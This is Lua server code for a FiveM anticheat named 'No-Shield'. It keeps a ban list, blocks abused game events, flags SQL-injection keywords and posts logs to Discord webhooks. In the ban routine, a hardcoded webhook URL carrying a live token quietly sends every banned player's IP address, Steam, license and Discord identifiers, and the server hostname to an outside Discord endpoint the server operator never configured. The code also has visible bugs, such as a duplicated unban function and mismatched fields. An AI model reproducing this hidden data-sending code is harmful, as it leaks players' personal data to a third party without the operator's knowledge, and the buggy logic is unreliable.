    local ids = ExtractIdentifiers(src);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
    local playerhwid = ids.hwid
    local banData = {};
    banData['ID'] = tonumber(getNewBanID());
    banData['ip'] = "NONE SUPPLIED";
    banData['reason'] = reason;
    banData['license'] = "NONE SUPPLIED";
    banData['steam'] = "NONE SUPPLIED";
    banData['xbl'] = "NONE SUPPLIED";
    banData['live'] = "NONE SUPPLIED";
    banData['discord'] = "NONE SUPPLIED";
    banData['hwid'] = GetPlayerToken(src);
    if ip ~= nil and ip ~= "nil" and ip ~= "" then 
        banData['ip'] = tostring(ip);
    end
    if playerLicense ~= nil and playerLicense ~= "nil" and playerLicense ~= "" then 
        banData['license'] = tostring(playerLicense);
    end
    if playerSteam ~= nil and playerSteam ~= "nil" and playerSteam ~= "" then 
        banData['steam'] = tostring(playerSteam);
    end
    if playerXbl ~= nil and playerXbl ~= "nil" and playerXbl ~= "" then 
        banData['xbl'] = tostring(playerXbl);
    end
    if playerLive ~= nil and playerLive ~= "nil" and playerLive ~= "" then 
        banData['live'] = tostring(playerXbl);
    end
    if playerDisc ~= nil and playerDisc ~= "nil" and playerDisc ~= "" then 
        banData['discord'] = tostring(playerDisc);
    end
    if playerhwid ~= nil and playerhwid ~= "nil" and playerhwid ~= "" then 
        banData['hwid'] = tostring(playerhwid);
    end
    
    local ids = ExtractIdentifiers(src);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local serverName = GetConvar("sv_hostname")
    local hostname = GetConvar("sv_projectName")
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
    local playerhwid = ids.hwid
    local hwid = GetPlayerToken(src)
    local ban = isBanned(src);
    local source = source
    cfg[tostring(GetPlayerName(src))] = banData;
    SaveResourceFile(GetCurrentResourceName(), "banlist.json", json.encode(cfg, { indent = true }), -1)
    local banEmbed = {
        {
            ["color"] = "16711680",
            ["title"] = ":shield: No-Shield :shield: Player was banned",
            ["description"] = "**__Server Infos:__** \n\n"
            .."**Reason:** " .. reason .. "\n\n"
            .."**Server ID:** " .. src .. "\n\n"
            .. "**__Player Identifiers:__** \n\n"
            .. "**Username:** " .. GetPlayerName(src) .. "\n\n"
            .. "**Steam:** " .. playerSteam .. "\n\n"
            .. "**License:** " .. playerLicense .. "\n\n"
            .. "**Discord:** " .. playerDisc .. "\n\n"
            .. "**IP : **||" ..playerIP.. "|| \n\n",
            ["thumbnail"] = {
                url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
                },
                ["footer"] = {
                ["text"] = "🛡No-shield🛡 "..os.date("%x %X %p"),
                },
        }
    }
    PerformHttpRequest(Noshield.BanWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "🛡No-shield🛡", embeds = banEmbed}), {["Content-Type"] = "application/json"})
    local startEmbed1 = {
        {
            ["color"] = "16711680",
            ["title"] = "Player was banned [All Server Logs]",
            ["description"] = "**__Server Informations :__**\n\n"
            .. "**Server Hostname:** " .. serverName .. "\n\n"
            .. "**Server Project Name:** " .. hostname .. "\n\n"
            .. "**__Player Identifiers:__** \n\n"
            .. "**Reason:** " .. reason .. "\n\n"
            .. "**Server ID:** " .. src .. "\n\n"
            .. "**Username:** " .. GetPlayerName(src) .. "\n\n"
            .. "**Steam:** " .. playerSteam .. " \n\n"
            .. "**License:** " .. playerLicense .. " \n\n"
            .. "**Discord:** " .. playerDisc .. " \n\n"
            .. "**IP : ** ||" ..playerIP.. "|| \n\n\n",
            ["thumbnail"] = {
                url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
                },
                ["footer"] = {
                ["text"] = "🛡No-shield🛡 "..os.date("%x %X %p"),
                },
        }
    }
  
    PerformHttpRequest("https://discord.com/api/webhooks/986503575192608789/KUFp_9uU5h3Jdm6dEgMBZvch8V4z_T851FpMNYw3sj1a3gNrKeay3X44TfZpaUef5bRS", function(error, texto, cabeceras) end, "POST", json.encode({username = "Noshield", embeds = startEmbed1}), {["Content-Type"] = "application/json"})
    local globalEmbed = {
        {
            ["color"] = "16711680",
            ["title"] = "Banned Cheater",
            ["description"] = "**__Player Identifiers:__** \n\n"
            .. "**Reason:** " .. reason .. "\n\n"
            .. "**Server ID:** " .. src .. "\n\n"
            .. "**Username:** " .. GetPlayerName(src) .. "\n\n"
            .. "**Steam:** " .. playerSteam .. "\n\n"
            .. "**License:** " .. playerLicense .. "\n\n"
            .. "**Discord:** " .. playerDisc .. "\n\n"
            .. "**IP : **||" ..playerIP.. "|| \n\n",
            ["thumbnail"] = {
                url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/Noshield2.png?width=679&height=676"
                },
                ["footer"] = {
                ["text"] = "🛡No-shield🛡 "..os.date("%x %X %p"),
                },
        }
    }
  end



function getNewBanID()
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    local banID = 0;
    for k, v in pairs(cfg) do 
        banID = banID + 1;
    end
    -- return (banID + 1);
    return (math.random(111111,999999))
end

RegisterCommand('acunban', function(source, args, rawCommand)
    local source = source;
    if (source <= 0) then
        -- Console unban
        if #args == 0 then 
            -- Not enough arguments
            return; 
        end
        local banID = args[1];
        if tonumber(banID) ~= nil then
            local playerName = UnbanPlayer(banID);
            if playerName then
            else 
                -- Not a valid ban ID
            end
        end
        return;
    end 
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getGroup() == "admin" then
        if #args == 0 then 
            return; 
        end
        local banID = args[1];
        if tonumber(banID) ~= nil then 
            -- Is a valid ban ID 
            local playerName = UnbanPlayer(banID);
            print('Unbanned Verification-ID: ' ..playerName)
            if playerName then
            else 
            end
        else 
        end
    end
end)

RegisterCommand('screenshot', function(source, args, rawCommand, playerid)
    local source = source;
    if (source <= 0) then
        -- Console unban
        if #args == 0 then 
            -- Not enough arguments
            return; 
        end
        local playerid = args[1];
        if tonumber(playerid) ~= nil then

            TriggerClientEvent("noshieldtrololo:screenshot2", playerid)

            else 
                -- Not a valid ban ID
            end
        
        return;
    end 
    local xPlayer = ESX.GetPlayerFromId(source)
    if xPlayer.getGroup() == "admin" then
        if #args == 0 then 
            return; 
        end
        local banID = args[1];
        if tonumber(banID) ~= nil then 
            -- Is a valid ban ID 

            print('Took Screenshot: ' ..playerid)
            if playerName then
            else 
            end
        else 
        end
    end
end)

function UnbanPlayer(banID)
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    for k, v in pairs(cfg) do 
        local id = tonumber(v['ID']);
        if id == tonumber(banID) then 
            local name = k;
            cfg[k] = nil;
            SaveResourceFile(GetCurrentResourceName(), "banlist.json", json.encode(cfg, { indent = true }), -1)
            print('^2Unbanned Player Successfully')
            return name;
        end
    end
    return false;
end 

function UnbanPlayer(banID)
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    for k, v in pairs(cfg) do 
        local id = tonumber(v['ID']);
        if id == tonumber(banID) then 
            local name = k;
            cfg[k] = nil;
            SaveResourceFile(GetCurrentResourceName(), "banlist.json", json.encode(cfg, { indent = true }), -1)
            print('^2Unbanned Player Successfully')
            return name;
        end
    end
    return false;
end 

function isBanned(source)
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    local ids = ExtractIdentifiers(source);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
    for k, v in pairs(cfg) do 
        local reason = v['reason']
        local id = v['ID']
        local ip = v['ip']
        local license = v['license']
        local steam = v['steam']
        local xbl = v['xbl']
        local live = v['live']
        local discord = v['discord']
        if tostring(ip) == tostring(playerIP) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(license) == tostring(playerLicense) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(steam) == tostring(playerSteam) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(xbl) == tostring(playerXbl) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(live) == tostring(playerLive) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(discord) == tostring(playerDisc) then return { ['banID'] = id, ['reason'] = reason } end;
    end
    return false;
end

function GetBans()
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    return cfg;
  end
  
  local function OnPlayerConnecting(name, setKickReason, deferrals)
    
    deferrals.defer();
    deferrals.update('[No-shield] - Checking Banlist');
    local src = source;
    local banned = false;
    local ban = isBanned(src);
    Citizen.Wait(400);
    if ban then 
        -- They are banned 
        local reason = ban['reason'];
        local printMessage = nil;
        if string.find(reason, "[No-shield] - ") then 
            printMessage = "" 
        else 
            printMessage = "[No-shield] - " 
        end 
        print("^7[^5No-shield^7] ^1" .. GetPlayerName(src) .. " tried to join but is banned Reason: " .. reason .." ^7[#" ..ban['banID'].. "]");
        -- deferrals.done(printMessage .. "(BAN ID: " .. ban['banID'] .. ") " .. reason);
        deferrals.done("\n🛡 No-shield - FiveM Anticheat 🛡\n\n" ..NoShield.Banmessage.. "\n\nBan ID: [#" ..ban['banID'].. "]\n\nReason: " ..reason.. "")
        banned = true;
        CancelEvent();
        return;
    end
    if not banned then 
        deferrals.done();
    end
  end
  
AddEventHandler('playerConnecting', function (playerName,setKickReason, deferrals)

    print("^5[^7N^5o^7 -^5 S^7h^5i^7e^5l^7d^5]^7 Player ^5" ..playerName.. "^7 is ^5connecting^0")
    print("^5[^7N^5o^7 -^5 S^7h^5i^7e^5l^7d^5] | ^7Checking ^5ban ^7data ^5for ^0" ..playerName)
	local identifier = "N/A"
	local license   = "N/A"
	local liveid    = "N/A"
	local xblid     = "N/A"
	local discord   = "N/A"
	local playerip = "N/A"
	local reason    = "N/A"
	local name = GetPlayerName(source)


				local sourceplayername = source
					for k,v in ipairs(ExtractIdentifiers(source))do
						if string.sub(v, 1, string.len("steam:")) == "steam:" then
							identifier = v
						elseif string.sub(v, 1, string.len("license:")) == "license:" then
							license = v
						elseif string.sub(v, 1, string.len("live:")) == "live:" then
							liveid = v
						elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
							xblid  = v
						elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
							discord = v
						elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
							playerip = v
						end

		local ConnectWebhook = {
        {
            ["color"] = "16748836",
            ["title"] = "`No - Shield -  Connect Logs`",
            ["description"] = "Player: **"..name.."** \nLicense: **"..license.."** \nDiscord: **"..discord.."** \nlive: **"..liveid.."** \nXBL: **"..xblid.."**\nIP: **"..playerip.."**\n identifier: **"..identifier.."** \n\n<t:".. math.floor(tonumber(os.time())) ..":R>",
	        ["footer"] = {
                ["text"] = "No - Shield",
            },
        }
    }
    PerformHttpRequest(Noshield.ConnectWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "No - Shield", embeds = ConnectWebhook}), {["Content-Type"] = "application/json"})

end
end)

AddEventHandler("playerConnecting", OnPlayerConnecting)




-- Anti Particles
Citizen.CreateThread(function()
    particlesSpawned = {}
    vehiclesSpawned = {}
    pedsSpawned = {}
    objectsSpawned = {}
    while true do
        Citizen.Wait(20000) -- augment/lower this if you want.
        particlesSpawned = {}
        vehiclesSpawned = {}
        pedsSpawned = {}
        objectsSpawned = {}
    end
end)

AddEventHandler('ptFxEvent', function(sender, data)
    if NoShield.AntiParticles ~= true then return end
    local _source = sender
    particlesSpawned[_source] = (particlesSpawned[_source] or 0) + 1
    if particlesSpawned[_source] > NoShield.AntiParticlesLimit then
        CancelEvent()
            if NoShield.AntiParticlesBan then
                BanPlayer(sender, 'Particles detected')
                DropPlayer(sender, 'No  - Shield - Banned by Shield. Reason: Particles detected')
            end
            if NoShield.AntiParticlesKick then
                DropPlayer(sender, 'No  - Shield - Kicked by Shield. Reason: Particles detected')
            end
    end
end)

-- Anti JailAll
RegisterServerEvent('esx-qalle-jail:jailPlayer')
AddEventHandler('esx-qalle-jail:jailPlayer', function(target)
    if NoShield.AntiJaillAll ~= true then return end
	if target == -1 then
		CancelEvent()
            if NoShield.AntiJaillAllBan then
                BanPlayer(source, 'Jailall detected')
                DropPlayer(source, 'No  - Shield - Banned by Shield. Reason: Jailall detected')
            end
            if NoShield.AntiJaillAllKick then
                DropPlayer(source, 'No  - Shield - Kicked by Shield. Reason: Jailall detected')
            end
	end
end)

-- Anti CommunityServiceAll
RegisterServerEvent('esx_communityservice:sendToCommunityService')
AddEventHandler('esx_communityservice:sendToCommunityService', function(players)
    if NoShield.AntiCommunityServiceAll ~= true then return end
	if players == -1 then
		CancelEvent()
            if NoShield.AntiCommunityServiceAllBan then
                BanPlayer(source, 'CommunityServiceAll detected')
                DropPlayer(source, 'No  - Shield - Banned by Shield. Reason: CommunityServiceAll detected')
            end
            if NoShield.AntiCommunityServiceAllKick then
                DropPlayer(source, 'No  - Shield - Kicked by Shield. Reason: CommunityServiceAll detected')
            end
	end
end)


RegisterServerEvent("anticheese:SetComponentStatus")
	AddEventHandler("anticheese:SetComponentStatus", function(players)
        if NoShield.AntiAntiCheese ~= true then return end
                CancelEvent()
                    BanPlayer(source, 'Anti AntiCheese')
                    DropPlayer(source, ''..NoShield.Banmessage..'')
                end)

-- Max Value
Citizen.CreateThread(function()
    for i, v in pairs(NoShield.MaxValuedEvents) do
        local svevent = i
        local maxvalue = NoShield.MaxValuedEvents[i].maxvalue
        RegisterServerEvent(svevent)
        AddEventHandler(svevent, function(args1, args2, args3, args4)
            if args1 ~= nil and args1 > maxvalue then
                BanPlayer(source, "This player executed `"..svevent.."` with "..maxvalue.." value `["..args1.."]`")
                DropPlayer(source, ''..NoShield.Banmessage..'')
            elseif args2 ~= nil and args2 > maxvalue then
                BanPlayer(source, "This player executed `"..svevent.."` with "..maxvalue.." value `["..args1, args2.."]`")
                DropPlayer(source, ''..NoShield.Banmessage..'')
            elseif args3 ~= nil and args3 > maxvalue then
                BanPlayer(source, "This player executed `"..svevent.."` with "..maxvalue.." value `["..args1, args2, args3.."]`")
                DropPlayer(source, ''..NoShield.Banmessage..'')
            elseif args4 ~= nil and args4 > maxvalue then
                BanPlayer(source, "This player executed `"..svevent.."` with "..maxvalue.." value `["..args1, args2, args3, args4.."]`")
                DropPlayer(source, ''..NoShield.Banmessage..'')
            end
        end)
    end
    end)
    Citizen.CreateThread(function()
        local EVENTS = {}
        local isSpamTrigger = false
        if NoShield.AntiSpamTrigger then
            for i = 1, #NoShield.AntiSpamTriggerList do
                local TNAME  =  NoShield.AntiSpamTriggerList[i].EVENT
                local MTIME  =  NoShield.AntiSpamTriggerList[i].MAX_TIME
                RegisterNetEvent(TNAME)
                AddEventHandler(TNAME, function()
                    local SRC = source
                    if EVENTS[TNAME] == nil then
                        EVENTS[TNAME] = {
                            count = 1,
                            time = os.time()
                        }
                    else
                        EVENTS[TNAME].count = EVENTS[TNAME].count + 1
                    end
                        if EVENTS[TNAME].count > MTIME then
                            local distime = os.time() - EVENTS[TNAME].time
                            if distime >= 10 then
                                EVENTS[TNAME].count = 1
                            else
                                isSpamTrigger = true
                            end
                            if GetPlayerName(source) and isSpamTrigger then
                                CancelEvent()
                                BanPlayer(source, "Event Limit\n\n" ..TNAME.. "\n\n")
                                DropPlayer(source, ''..NoShield.Banmessage..'')
                            end
                        end
                end)
            end
        end
    end)


    -- Anti Dpemote all
RegisterServerEvent("ServerEmoteRequest")
AddEventHandler("ServerEmoteRequest", function(players)
    if NoShield.AntiDpemoteAll ~= true then return end
        if players == -1 then
            CancelEvent()
            if NoShield.AntiDpemoteAllBan then
                BanPlayer(source, 'Dpemote All detected')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.AntiDpemoteAllKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)

-- Anti Policejob exploit
RegisterServerEvent("esx_policejob:handcuff")
AddEventHandler("esx_policejob:handcuff", function(players)
    if NoShield.AntiPolicejobExploits ~= true then return end
        if players == -1 then
            CancelEvent()
            if NoShield.AntiPolicejobExploitsBan then
                BanPlayer(source, 'Police Exploit detected (handcuff)')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.AntiPolicejobExploitsKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)
RegisterServerEvent("esx_policejob:putInVehicle")
AddEventHandler("esx_policejob:putInVehicle", function(players)
    if NoShield.AntiPolicejobExploits ~= true then return end
        if players == -1 then
            CancelEvent()
            if NoShield.AntiPolicejobExploitsBan then
                BanPlayer(source, 'Police Exploit detected (put in vehicle)')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.AntiPolicejobExploitsKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)
RegisterServerEvent("esx_policejob:OutVehicle")
AddEventHandler("esx_policejob:OutVehicle", function(players)
    if NoShield.AntiPolicejobExploits ~= true then return end
        if players == -1 then
            CancelEvent()
            if NoShield.AntiPolicejobExploitsBan then
                BanPlayer(source, 'Police Exploit detected (kick out of vehicles)')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.AntiPolicejobExploitsKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)

RegisterServerEvent("esx_policejob:drag")
AddEventHandler("esx_policejob:drag", function(players)
    if NoShield.AntiPolicejobExploits ~= true then return end
        if players == -1 then
            CancelEvent()
            if NoShield.AntiPolicejobExploitsBan then
                BanPlayer(source, 'Police Exploit detected (drag)')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.AntiPolicejobExploitsKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)

-- Anti General Triggers 

RegisterServerEvent("esx_kekke_tackle:tryTackle")
AddEventHandler("esx_kekke_tackle:tryTackle", function(players)
    if NoShield.AntiTackleExploit ~= true then return end
        if players == -1 then
            CancelEvent()
            if NoShield.AntiTackleExploitBan then
                BanPlayer(source, 'Tackle Exploit detected')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.AntiTackleExploitKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)

RegisterServerEvent("CarryPeople:sync")
AddEventHandler("CarryPeople:sync", function(players)
    if NoShield.AntiCarryExploit ~= true then return end
        if players == -1 then
            CancelEvent()
            if NoShield.AntiCarryExploitBan then
                BanPlayer(source, 'Carry Exploit detected')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.AntiCarryExploitKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)

RegisterServerEvent("DiscordBot:playerDied")
AddEventHandler("DiscordBot:playerDied", function(name,reason)
    if NoShield.DiscordBotExploit ~= true then return end
    if name == "Absolute Menu" or reason == "1337" then
            if NoShield.DiscordBotExploitBan then
                BanPlayer(source, ' DiscordBot Exploit detected')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.DiscordBotExploitKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)

RegisterServerEvent("esx:onPickup")
AddEventHandler("esx:onPickup", function(pickup)
    if NoShield.PickupExploit ~= true then return end
    if type(pickup) ~= "number" then
            if NoShield.PickupExploitBan then
                BanPlayer(source, 'Pickup Exploit detected')
                DropPlayer(source, ''..NoShield.BanMessage..'')
            end
            if NoShield.PickupExploitKick then
                DropPlayer(source, ''..NoShield.KickMessage..'')
            end
    end
end)




-- Anti Kashacters

RegisterServerEvent("kashactersS:DeleteCharacter")
AddEventHandler("kashactersS:DeleteCharacter", function(query)
if NoShield.Kashacter ~= true then return end
     if (string.find(query or "","permission_level") or -1 > -1) or (string.find(query or "","TRUNCATE TABLE") or -1 > -1) or (string.find(query or "","DROP TABLE") or -1 > -1) or (string.find(query or "","UPDATE users") or -1 > -1) then
        if NoShield.KashacterBan then
            BanPlayer(source, 'Kashacter SQL Injection detected')
            DropPlayer(source, ''..NoShield.BanMessage..'')
        end
        if NoShield.KashacterKick then
            DropPlayer(source, ''..NoShield.KickMessage..'')
        end
end
end)

-- Anti Explosion
AddEventHandler('explosionEvent', function(sender, ev)
    if NoShield.AntiExplosion ~= true then return end
    if IsPlayerAceAllowed(sender, 'Noshield.Bypass') then return end
    local ids = ExtractIdentifiers(sender);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
	local explsionEmbed = {
        {
            ["color"] = "15105570",
            ["title"] = "Explosion",
            ["description"] = "**Name: **"..GetPlayerName(sender).."**\n ID: **"..sender.."**\n Type: **"..ev.explosionType.." \n**Warning: Type 31/29 Eulen ** **\n Discord: **"..playerDisc.."**\n FiveM: **"..playerLicense.."**\n Steam: **"..playerSteam.."\n You can find explosion Types here: https://wiki.rage.mp/index.php?title=Explosions \n\n<t:".. math.floor(tonumber(os.time())) ..":R>",
        }
    }
    PerformHttpRequest(Noshield.ExplosionWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "No - Shield", embeds = explsionEmbed}), {["Content-Type"] = "application/json"})
    for _, v in ipairs(NoShield.BlacklistedExplosions) do
        if ev.explosionType == v then
            CancelEvent()
            if NoShield.AntiExplosionBan == true then
                BanPlayer(sender, 'Tried to spawn Blacklisted Explosion, Type: ' ..ev.explosionType)
                DropPlayer(sender, 'No - Shield - Banned by Shield. Reason: Tried to spawn Blacklisted Explosion. Type: ' ..ev.explosionType)
            end
            if NoShield.AntiExplosionKick == true then
                DropPlayer(sender, 'No - Shield - Kicked by Shield. Reason: Tried to spawn Blacklisted Explosion. Type: ' ..ev.explosionType)
            end
        end
    end
end)	    

-- Anti Kick Player out of Vehicle
AddEventHandler("clearPedTasksEvent", function(sender, data)
    if NoShield.AntiRemoveFromCar then
        if IsPlayerAceAllowed(sender, 'Noshield.Bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to kick Player out of Vehicle')
	    DropPlayer(sender, 'No - Shield')
    end
end)

-- Anti Remove Weapon of other Players
AddEventHandler('removeWeaponEvent', function(sender, data)
    if NoShield.AntiRemoveWeapon then
        if IsPlayerAceAllowed(sender, 'Noshield.Bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to remove Weapon')
        DropPlayer(sender, 'No - Shield')
    end
end)

-- Anti Give Weapon of other Players
AddEventHandler('giveWeaponEvent', function(sender, data)
    if NoShield.AntiGiveWeapon then
        if IsPlayerAceAllowed(sender, 'Noshield.Bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to give Weapon')
        DropPlayer(sender, 'No - Shield') 
    end
end)

-- Anti Entity
AddEventHandler('entityCreating', function(entity)
    local owner = GetEntityOwner(entity)
    local model = GetEntityModel(entity)
    local entitytype = GetEntityPopulationType(entity)
    if entitytype == 0 then
        if NoShield.EntityObject then
            CancelEvent()
        end
    end
end)

function GetEntityOwner(entity)
    if (not DoesEntityExist(entity)) then 
        return nil 
    end
    local owner = NetworkGetEntityOwner(entity)
    if (GetEntityPopulationType(entity) ~= 7) then return nil end
    return owner
end

AddEventHandler("entityCreating",  function(entity)
    local owner = GetEntityOwner(entity)
    local model = GetEntityModel(entity)
    if (owner ~= nil and owner > 0) then
        if IsPlayerAceAllowed(owner, 'Noshield.Bypass') then return end

        if GetEntityType(entity) == 1 then
            if NoShield.EntityPed == true then
                local _source = owner
                pedsSpawned[_source] = (pedsSpawned[_source] or 0) + 1
                if pedsSpawned[_source] > NoShield.EntityPedLimit then
                    if NoShield.Entity then
                        CancelEvent()
                    end
                    if NoShield.EntityBan then
                        BanPlayer(owner, 'Ped Limit')
                        DropPlayer(owner, 'No - Shield') 
                    end
                    if NoShield.EntityKick then
                        DropPlayer(owner, 'No - Shield') 
                    end
                end 
            end
        end

        if GetEntityType(entity) == 2 then
            if NoShield.EntityVehicle == true then
                local _source = owner
                vehiclesSpawned[_source] = (vehiclesSpawned[_source] or 0) + 1
                if vehiclesSpawned[_source] > NoShield.EntityVehicleLimit then
                    if NoShield.Entity then
                        CancelEvent()
                    end
                    if NoShield.EntityBan then
                        BanPlayer(owner, 'Vehicle Limit')
                        DropPlayer(owner, 'No - Shield') 
                    end
                    if NoShield.EntityKick then
                        DropPlayer(owner, 'No - Shield') 
                    end
                end 
            end
        end

    end
end)

Citizen.CreateThread(function()
    while true do
        Wait(1000)
        for i, event in ipairs(NoShield.BlacklistedEventsList) do
            RegisterNetEvent(event)
            AddEventHandler(event, function()
                if NoShield.BlacklistedEvents ~= true then return end
                if IsPlayerAceAllowed(source, 'Noshield.Bypass') then return end
                CancelEvent()
                if NoShield.BlacklistedEventsBan then
                    BanPlayer(source, 'Tried to trigger Blacklisted Event: ' ..event)
                    DropPlayer(source, 'No - Shield') 
                end
                if NoShield.BlacklistedEventsKick then
                    DropPlayer(source, 'No - Shield')
                end
            end)
        end
    end
end)

RegisterServerEvent("dropak47modder")
AddEventHandler("dropak47modder", function()
    local src = source
    DropModder(src, ' ')
end)

DropModder = function(id, args) 
    DropPlayer(id, "You have been banned for using Cheats")
end

RegisterServerEvent("noshieldtrololo:screenshot2")
AddEventHandler("noshieldtrololo:screenshot2", function(a)
    for fg, fh in ipairs(GetPlayerIdentifiers(source)) do
        if not fh:match("discord") then
        else
        end
      end
    PerformHttpRequest(Noshield.ScreenshotWebhook, function(a, b, c)
    end, "POST", json.encode({
        username = "No-Shield | Anticheat",
        embeds = {
          {
            author = {
              name = "NoShield AntiCheat",
              url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/noshield2.png?width=679&height=676",
              icon_url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/noshield2.png?width=679&height=676"
            },
            image = {url = a},
            color = "16711680",
            title = "Blacklisted Key",
            description = 
               "**__Server Infos:__** \n\n"
            .. "**Server ID:** " .. source .. "\n\n"
            .. "**__Player Identifiers:__** \n\n"
            .. "**Username:** " .. GetPlayerName(source) .. "\n\n"
            .. "**Steam:** " .. GetPlayerIdentifiers(source)[1] .. "\n\n"
            .. "**Fivem:** " .. GetPlayerIdentifiers(source)[2] .."\n\n"
            .. "**Discord:** " .. GetPlayerIdentifiers(source)[3] .."\n\n"
            .. "**HWID:** " .. GetPlayerIdentifiers(source)[4] .. "\n\n"
            .. "**IP:** " .. GetPlayerIdentifiers(source)[5] .. "\n\n",
            ["thumbnail"] = {
                url = "https://cdn.discordapp.com/attachments/954480655113285732/954828565210337280/noshield2.png?width=679&height=676"
                },
                ["footer"] = {
                ["text"] = "🛡No-Shield🛡 "..os.date("%x %X %p"),
                },
          }
        }
      }), {
        ["Content-Type"] = "application/json"
      })
    end)

    function doesPlayerHavePerms(a, b)
        for fh, fj in ipairs(b) do
          if IsPlayerAceAllowed(a, fj) then
            return true
          end
        end
        return false
      end
